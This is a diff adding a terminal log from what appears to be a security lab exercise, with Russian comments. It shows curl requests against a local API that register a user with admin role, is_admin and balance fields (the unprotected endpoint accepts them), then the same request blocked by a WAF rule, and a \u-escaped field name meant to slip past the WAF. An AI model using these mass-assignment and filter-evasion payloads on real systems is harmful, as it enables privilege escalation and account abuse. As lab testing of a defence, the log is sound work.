@@ -1,0 +1,11 @@
+root@enu-lab:~/pr7# # Mass Assignment: регистрация с привилегированными полями — напрямую в API
+root@enu-lab:~/pr7# curl -s -w '\nHTTP %{http_code}\n' http://127.0.0.1:5000/api/v1/register -H 'Content-Type: application/json' -d '{"username":"mallory","password":"Mallory#2026","role":"admin","is_admin":true,"balance":1000000}'
+{"balance":1000000,"card_last4":null,"email":null,"full_name":null,"id":105,"iin":null,"is_admin":1,"phone":null,"role":"admin","username":"mallory"}
+
+HTTP 201
+root@enu-lab:~/pr7# # тот же запрос через WAF (правило 1010)
+root@enu-lab:~/pr7# curl -s -o /dev/null -w 'HTTP %{http_code}\n' -H 'Host: api.local' http://127.0.0.1/api/v1/register -H 'Content-Type: application/json' -d '{"username":"mallory2","password":"Mallory#2026","role":"admin","is_admin":true}'
+HTTP 403
+root@enu-lab:~/pr7# # обход через \u-экранирование имени поля
+root@enu-lab:~/pr7# curl -s -o /dev/null -w 'HTTP %{http_code}\n' -H 'Host: api.local' -X PATCH http://127.0.0.1/api/v1/users/101/profile -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"\u0069s_admin":1}'
+HTTP 403
